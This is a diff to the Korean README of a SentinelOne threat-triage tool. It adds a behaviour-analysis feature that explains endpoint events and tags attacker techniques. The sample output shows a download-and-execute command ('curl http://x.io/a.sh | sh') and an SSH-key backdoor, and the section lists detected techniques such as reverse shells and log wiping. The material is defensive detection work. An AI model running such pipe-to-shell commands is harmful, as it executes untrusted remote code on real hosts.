@@ -11,7 +11,7 @@ SentinelOne 콘솔에서 미해결 위협(Threat)이 새로 생기면 해당 위
       │  GET  /dv/query-status (완료까지 대기)
       │  GET  /dv/events       (nextCursor 페이지네이션)
       ▼
-[ 분석 ]  LOLBin·명령줄 패턴(MITRE ATT&CK), IOC 추출
+[ 분석 ]  행위 설명(타임라인·요약), LOLBin·명령줄 패턴(MITRE ATT&CK), IOC 추출
       ▼
 [ Enrichment ]  VirusTotal / AbuseIPDB (API 키가 있을 때만)
       ▼
@@ -58,6 +58,31 @@ python -m s1triage --threat-id 1234567890   # 특정 위협 1건만 분석
 | `ABUSEIPDB_API_KEY` | (선택) | AbuseIPDB 키: IP 평판 조회 |
 | `ENRICH_MAX_LOOKUPS` | 10 | 위협 1건당 TI 조회 상한 (무료 쿼터 보호) |
 | `REPORT_DIR` | (비움) | JSON 리포트 저장 디렉터리 |
+| `REPORT_RAW_EVENTS` | false | true 면 JSON 리포트에 DV 원본 이벤트 포함 (필드명 확인·룰 튜닝용) |
+
+## 행위 분석 (무엇을 했는지 설명)
+
+DV 이벤트 하나하나를 "어떤 프로세스가 무엇을 했는지" 한 줄로 풀어 쓰고, 위험한 행위에는 그 의미를 설명합니다.
+
+```
+[행위 분석]
+· 주요 행위 주체는 bash(부모: sshd), 함께 등장한 프로세스: curl.
+· 총 5개 이벤트 (...): 프로세스 실행 1건, 파일 수정 2건, 로그인 2건.
+· 주목할 행위: SSH 키 등록(백도어), 다운로드 즉시 실행, 외부 파일 다운로드, 로그인 실패.
+주목할 행위 설명:
+  ▶ SSH 키 등록(백도어) [T1098.004]
+    의미: 공격자가 자신의 SSH 공개키를 넣어 비밀번호 없이 다시 접속할 수 있게 만드는 대표적인 지속성 수법입니다.
+    근거: [bash] 파일 수정: /root/.ssh/authorized_keys
+행위 타임라인 (시간순, 같은 행위는 묶음):
+  04:52:51  사용자 root 로그인 실패 (출발지 45.1.2.3) ×2 ⚠
+  04:52:53  [bash] curl 실행 (명령: curl http://x.io/a.sh | sh) ⚠
+  04:52:54  [bash] 파일 수정: /root/.ssh/authorized_keys ⚠
+```
+
+- 지원 이벤트: 프로세스 실행, 파일 생성/수정/삭제/이름변경, 네트워크 연결/리슨, DNS, URL, 레지스트리, 로그인/로그아웃, 예약 작업, 프로세스 핸들 접근, 스크립트, 모듈/드라이버 로드, SentinelOne 행위 지표. 그 외 유형도 "[프로세스] 유형 이벤트" 형태로 표시됩니다.
+- 위험 행위 태그: SSH 키 등록, 계정/sudoers 변경, cron·systemd·셸 시작 스크립트 등 지속성, 로그·명령 기록 삭제, 임시 폴더 실행, 다운로드 후 즉시 실행, 리버스 셸, 정찰 명령, 계정 생성, 자동 실행 레지스트리, 보안 설정 변경, LSASS 접근, 의심 포트 통신 등.
+- 정상 동작 오탐 줄이기: sshd·rsyslogd 같은 데몬이 `/var/log` 에 기록하는 것은 흔적 삭제로 보지 않고(삭제·이름변경이나 셸/일반 도구로 고친 경우만 해당), systemd 가 띄운 `sshd -D` 데몬 자체는 의심 프로세스로 보지 않습니다.
+- 규칙은 `s1triage/behavior.py` 의 `PATH_RULES`, `REGISTRY_RULES`, `CMD_RULES` 에 정규식으로 정의되어 있어 쉽게 추가할 수 있습니다.
 
 ## 프로토타입 대비 변경 사항
 
@@ -79,6 +104,7 @@ s1triage/
   config.py      환경변수/.env 로딩
   client.py      SentinelOne API (threats, dv/init-query, query-status, events)
   analyzer.py    LOLBin·명령줄 탐지, IOC 추출
+  behavior.py    행위 설명 문장, 위험 행위 태그, 타임라인/요약
   enrichment.py  VirusTotal / AbuseIPDB
   state.py       처리한 위협 ID 저장
   report.py      위험도 산정, 콘솔/JSON 리포트
